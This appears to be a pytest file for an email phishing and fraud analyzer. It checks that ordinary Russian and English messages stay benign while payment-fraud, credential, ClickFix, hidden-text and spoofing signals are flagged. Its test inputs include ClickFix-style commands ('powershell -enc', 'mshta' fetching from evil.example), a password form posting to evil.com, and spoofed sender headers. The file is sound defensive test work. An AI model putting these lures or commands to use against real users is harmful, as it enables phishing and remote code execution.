"""Ninth-pass fixes: quieter phrases, xhtml, allowlist, subject key."""

from __future__ import annotations

from reliquary.core.allowlist import build_allowlist, domain_matches, tag_allowlist
from reliquary.core.content_signals import (
    BEC_RE,
    CLICKFIX_RE,
    CREDENTIAL_RE,
    HIDDEN_STYLE_RE,
    MESSENGER_LURE_RE,
)
from reliquary.core.lookalike import check_display_name_spoof, check_domain
from reliquary.core.models import Ioc, IocType
from reliquary.core.pipeline import analyze_text, campaign_divergence_keys, campaign_key_for


def _two_hops() -> str:
    return (
        "Received: from mx1.example.org (mx1.example.org [203.0.113.1]) "
        "by mx.dest.test; Wed, 17 Sep 2025 10:00:00 +0000\n"
        "Received: from sender.example.net (sender.example.net [203.0.113.2]) "
        "by mx1.example.org; Wed, 17 Sep 2025 09:59:00 +0000\n"
    )


def _eml(headers: dict[str, str], body: str, *, content_type: str = "text/plain; charset=utf-8") -> str:
    lines = [f"{key}: {value}" for key, value in headers.items()]
    lines.append("MIME-Version: 1.0")
    lines.append(f"Content-Type: {content_type}")
    lines.append("")
    lines.append(body)
    return "\n".join(lines)


def _pass_mail(
    body: str,
    extra: dict[str, str] | None = None,
    *,
    content_type: str = "text/plain; charset=utf-8",
) -> str:
    headers = {
        "From": "News <news@company.example>",
        "To": "user@company.example",
        "Subject": "hello",
        "Message-ID": "<m@company.example>",
        "Authentication-Results": "mx.example; spf=pass; dkim=pass; dmarc=pass",
    }
    if extra:
        headers.update(extra)
    return _two_hops() + _eml(headers, body, content_type=content_type)


def _reasons(result) -> str:
    assert result.verdict is not None
    return " ".join(c.reason or "" for c in result.verdict.breakdown)


def _benign(body: str, extra: dict[str, str] | None = None, *, content_type: str = "text/plain; charset=utf-8"):
    result = analyze_text(_pass_mail(body, extra, content_type=content_type), label="q.eml")
    assert "DMARC+DKIM" in _reasons(result)
    assert result.verdict is not None
    assert result.verdict.level.value == "benign", (body, result.verdict.score, _reasons(result))
    return result


def test_ordinary_transfer_and_iban_fragment_stay_quiet() -> None:
    quiet = (
        "The wire transfer was completed yesterday",
        "Your bank transfer was reversed",
        "перевод насчет встречи в четверг",
        "Срочный перевод сотрудника в другой отдел",
        "Оплата сегодня уже получена",
        "Изменится платежный календарь",
        "IBAN BY20 указан в инструкции",
        "Работаем только в Telegram",
    )
    for phrase in quiet:
        assert BEC_RE.search(phrase) is None, phrase
        assert MESSENGER_LURE_RE.search(phrase) is None, phrase
        result = _benign(phrase)
        assert "bec_payment" not in (result.content_signals or []), phrase
        assert "messenger_lure" not in (result.content_signals or []), phrase

    kept = (
        "wire transfer of funds",
        "wire transfer of the amount",
        "CEO urgent wire transfer",
        "перевод на карту",
        "перевод на счет",
        "срочно переведите на карту",
        "оплатите сегодня по новым реквизитам",
        "изменить платёжные реквизиты",
        "new bank details",
    )
    for phrase in kept:
        assert BEC_RE.search(phrase), phrase

    assert BEC_RE.search("wire transfer of the files") is None
    assert BEC_RE.search("Оплата сегодня не требуется") is None
    assert MESSENGER_LURE_RE.search("в Telegram") is None
    hostile = analyze_text(
        _pass_mail("Смените реквизиты и оплатите сегодня только в Telegram"),
        label="bec.eml",
    )
    assert "bec_payment" in (hostile.content_signals or [])
    assert hostile.verdict is not None
    assert hostile.verdict.level.value == "suspicious"


def test_account_number_and_password_policy_are_not_harvest() -> None:
    quiet = (
        "Please verify account number on the invoice",
        "Please change the password policy",
        "update your account preferences in HR",
    )
    for phrase in quiet:
        assert CREDENTIAL_RE.search(phrase) is None, phrase
        result = _benign(phrase)
        assert "credential_harvest" not in (result.content_signals or []), phrase

    assert CREDENTIAL_RE.search("Please enter your password")
    assert CREDENTIAL_RE.search("Please change your password")
    assert CREDENTIAL_RE.search("update your password")
    assert CREDENTIAL_RE.search("Password policy was updated") is None
    kept = analyze_text(_pass_mail("Please enter your password"), label="cred.eml")
    assert "credential_harvest" in (kept.content_signals or [])
    assert "DMARC+DKIM" not in _reasons(kept)
    assert kept.verdict is not None
    assert kept.verdict.level.value == "unknown"
    assert kept.verdict.score == 14


def test_bare_win_key_and_paste_command_are_not_clickfix() -> None:
    quiet = (
        "нажмите клавишу Win в лотерее отдела",
        "вставьте команду в регламент охраны",
        "press the windows key to lock the screen",
    )
    for phrase in quiet:
        assert CLICKFIX_RE.search(phrase) is None, phrase
        result = _benign(phrase)
        assert "clickfix" not in (result.content_signals or []), phrase

    assert CLICKFIX_RE.search("Нажмите Win+R")
    assert CLICKFIX_RE.search("powershell -enc QQ==")
    assert CLICKFIX_RE.search("mshta http://evil.example/a")
    kept = analyze_text(_pass_mail("Нажмите Win+R"), label="click.eml")
    assert "clickfix" in (kept.content_signals or [])
    assert "DMARC+DKIM" not in _reasons(kept)


def test_product_second_word_is_not_display_spoof() -> None:
    quiet = (
        "Microsoft 365 <it@company.example>",
        "Microsoft Edge <it@company.example>",
        "Microsoft Word <it@company.example>",
        "Google Docs <bot@company.example>",
        "Google Drive <bot@company.example>",
        "Google Meet <bot@company.example>",
        "Яндекс Диск <news@company.example>",
        "Яндекс Музыка <news@company.example>",
        "Яндекс Почта <news@company.example>",
        "Сбер Прайм <shop@company.example>",
        "Apple Music <it@company.example>",
        "Apple Pay <it@company.example>",
        "Тинькофф Инвестиции <news@company.example>",
        "ВТБ Онлайн <news@company.example>",
        "Kaspi Gold <news@company.example>",
        "Газпром медиа <press@company.example>",
        "Альфа Страхование <news@company.example>",
        "Microsoft Teams <it@company.example>",
        "Outlook calendar <bot@company.example>",
    )
    for header in quiet:
        assert check_display_name_spoof(header) == [], header
        result = _benign("график", {"From": header})
        assert result.verdict is not None

    for header in (
        "Microsoft <evil@evil.example>",
        "ЦБ <evil@evil.example>",
        "Сбербанк <thief@evil.top>",
        "Kaspi <noreply@evil.top>",
    ):
        spoof = check_display_name_spoof(header)
        assert spoof and spoof[0].kind == "display_spoof", header


def test_vendor_other_tld_and_longer_label_are_not_brand_spoof() -> None:
    domains, _ips = build_allowlist()
    quiet = (
        "googleadservices.com",
        "googlevideo.com",
        "yandex.net",
        "office.net",
        "dropboxusercontent.com",
        "paypalobjects.com",
        "github.io",
        "apple-cloudkit.com",
        "amazontrust.com",
    )
    for host in quiet:
        hits = check_domain(host)
        assert not any(h.kind == "brand_spoof" for h in hits), host
        assert not domain_matches(host, domains), host
        result = _benign(f"https://{host}/status")
        assert result.verdict is not None

    assert any(h.kind == "levenshtein" for h in check_domain("microsft.com"))
    assert any(h.kind == "brand_spoof" for h in check_domain("microsoft-login.top"))
    blocked = analyze_text(_pass_mail("https://microsft.com/status"), label="typo.eml")
    assert "DMARC+DKIM" not in _reasons(blocked)
    foreign = analyze_text(_pass_mail("https://microsoft-login.top/status"), label="suffix.eml")
    assert "DMARC+DKIM" not in _reasons(foreign)


def test_password_form_blocks_the_same_pass_as_a_credential_phrase() -> None:
    html = '<form action="https://evil.com/login"><input type="password"></form>'
    formed = analyze_text(
        _pass_mail(html, content_type="text/html; charset=utf-8"),
        label="form.eml",
    )
    assert "html_password_form" in (formed.content_signals or [])
    assert "DMARC+DKIM" not in _reasons(formed)
    assert formed.verdict is not None
    assert formed.verdict.level.value == "unknown"
    assert formed.verdict.score == 14

    phrase = analyze_text(_pass_mail("Please enter your password"), label="phrase.eml")
    assert "credential_harvest" in (phrase.content_signals or [])
    assert "DMARC+DKIM" not in _reasons(phrase)
    assert phrase.verdict is not None
    assert phrase.verdict.score == formed.verdict.score


def test_small_shift_and_percent_height_are_not_hidden_text() -> None:
    long = "Это обычный видимый абзац письма для клиента компании и отдела."
    visible = (
        "position:absolute; left:-1px",
        "left:-100px",
        "max-height:0%",
        "overflow:hidden; height:0%",
    )
    for style in visible:
        assert HIDDEN_STYLE_RE.search(style) is None, style
        html = f'<div style="{style}">{long}</div>'
        result = _benign(html, content_type="text/html; charset=utf-8")
        assert "hidden_text" not in (result.content_signals or []), style

    assert HIDDEN_STYLE_RE.search("font-size:0%") is None
    assert HIDDEN_STYLE_RE.search("font-size:0")
    assert HIDDEN_STYLE_RE.search("left:-9999px")
    assert HIDDEN_STYLE_RE.search("max-height:0")
    hidden = analyze_text(
        _pass_mail(
            f'<div style="position:absolute; left:-9999px">{long}</div>',
            content_type="text/html; charset=utf-8",
        ),
        label="hide.eml",
    )
    assert "hidden_text" in (hidden.content_signals or [])
    assert "DMARC+DKIM" not in _reasons(hidden)


def test_xhtml_uses_the_same_html_parse_as_html() -> None:
    page = "<html><body>Смените реквизиты\nhttps://evil.example/pay\n</body></html>\n"

    def part(filename: str | None, ctype: str, payload: str) -> str:
        disp = f'Content-Disposition: attachment; filename="{filename}"\n' if filename else ""
        return (
            f"--BOUND\nContent-Type: {ctype}\n{disp}\n{payload}"
        )

    def mail(filename: str | None, ctype: str) -> str:
        raw = (
            "From: News <news@company.example>\n"
            "To: user@company.example\n"
            "Subject: pay\n"
            "Message-ID: <m@company.example>\n"
            "Authentication-Results: mx.example; spf=pass; dkim=pass; dmarc=pass\n"
            "MIME-Version: 1.0\n"
            "Content-Type: multipart/mixed; boundary=BOUND\n"
            "\n"
            "--BOUND\n"
            "Content-Type: text/plain; charset=utf-8\n"
            "\n"
            "см. вложение\n"
            f"{part(filename, ctype, page)}"
            "--BOUND--\n"
        )
        return _two_hops() + raw

    html = analyze_text(mail("page.html", "text/html; charset=utf-8"), label="html.eml")
    xhtml_file = analyze_text(
        mail("page.xhtml", "application/xhtml+xml; charset=utf-8"),
        label="xhtml.eml",
    )
    xhtml_part = analyze_text(
        mail(None, "application/xhtml+xml; charset=utf-8"),
        label="xhtml-part.eml",
    )
    assert html.verdict is not None
    assert html.verdict.level.value == "suspicious"
    for result, name in ((xhtml_file, "page.xhtml"), (xhtml_part, "attachment.xhtml")):
        assert result.verdict is not None
        assert result.verdict.level.value == html.verdict.level.value, name
        assert result.verdict.score == html.verdict.score, name
        assert "bec_payment" in (result.content_signals or []), name
        assert any("evil.example/pay" in i.value for i in result.iocs if i.ioc_type.value == "url"), name
        assert any(
            a.filename == name and "html_attachment" in (a.risk_flags or [])
            for a in result.attachments
        ), name


def test_meeting_and_document_hosts_stay_visible() -> None:
    domains, ips = build_allowlist()
    hidden = (
        "calendar.google.com",
        "meet.google.com",
        "classroom.google.com",
        "lookerstudio.google.com",
        "teams.microsoft.com",
        "teams.office.com",
        "loop.microsoft.com",
        "visio.office.com",
        "delve.office.com",
    )
    for host in hidden:
        assert not domain_matches(host, domains), host
    for host in (
        "outlook.office.com",
        "login.live.com",
        "accounts.google.com",
        "mail.google.com",
    ):
        assert domain_matches(host, domains), host

    iocs = [Ioc(f"https://{host}/a", IocType.URL) for host in hidden]
    iocs.append(Ioc("https://evil.example/a", IocType.URL))
    iocs.append(Ioc("https://mail.google.com/mail", IocType.URL))
    iocs.append(Ioc("https://accounts.google.com/signin", IocType.URL))
    iocs.append(Ioc("https://login.live.com/login", IocType.URL))
    iocs.append(Ioc("outlook.office.com", IocType.DOMAIN))
    tag_allowlist(iocs, domains, ips)
    for ioc in iocs[: len(hidden) + 1]:
        assert "allowlisted" not in ioc.tags, ioc.value
    for ioc in iocs[len(hidden) + 1 :]:
        assert "allowlisted" in ioc.tags, ioc.value


def test_orphan_reply_uses_the_subject_reply_prefixes() -> None:
    def mail(subject: str, *, reply: bool) -> str:
        extra = {"Subject": subject}
        if reply:
            extra["In-Reply-To"] = "<root@company.example>"
        return _pass_mail("body", extra)

    for subject in ("Re: Invoice", "Ответ: Invoice", "Re[2]: Invoice", "На: Invoice"):
        orphan = analyze_text(mail(subject, reply=False), label="orphan.eml")
        assert any(h.name == "Orphan reply" for h in orphan.headers), subject
        assert "DMARC+DKIM" not in _reasons(orphan), subject
        assert orphan.verdict is not None
        assert orphan.verdict.level.value == "unknown", subject
        assert orphan.verdict.score == 12, subject


def test_forward_and_gateway_marks_share_the_subject_key() -> None:
    plain = analyze_text(_pass_mail("body", {"Subject": "Invoice Q3"}), label="s0.eml")
    assert campaign_key_for(plain) == "subj:invoice q3"
    keyed = [plain]
    for subject in (
        "Пересылка: Invoice Q3",
        "[SPAM] Invoice Q3",
        "External: Invoice Q3",
        "Внешнее: Invoice Q3",
    ):
        same = analyze_text(
            _pass_mail(
                "body",
                {"Subject": subject, "From": "Other <other@elsewhere.example>"},
            ),
            label="s1.eml",
        )
        assert campaign_key_for(same) == "subj:invoice q3", subject
        keyed.append(same)
    assert "subj:invoice q3" in campaign_divergence_keys(keyed)

    def thread_points(result) -> list[int]:
        return [
            c.points
            for c in result.verdict.breakdown
            if "существующем треде" in (c.reason or "")
        ]

    bare = analyze_text(
        _pass_mail(
            "body",
            {"Subject": "Re: Invoice Q3", "In-Reply-To": "<root@company.example>"},
        ),
        label="t0.eml",
    )
    for subject in ("[SPAM] Re: Invoice Q3", "Пересылка: Re: Invoice Q3", "External: Re: Invoice Q3"):
        gated = analyze_text(
            _pass_mail(
                "body",
                {"Subject": subject, "In-Reply-To": "<root@company.example>"},
            ),
            label="t1.eml",
        )
        assert thread_points(gated) == thread_points(bare) == [-4], subject
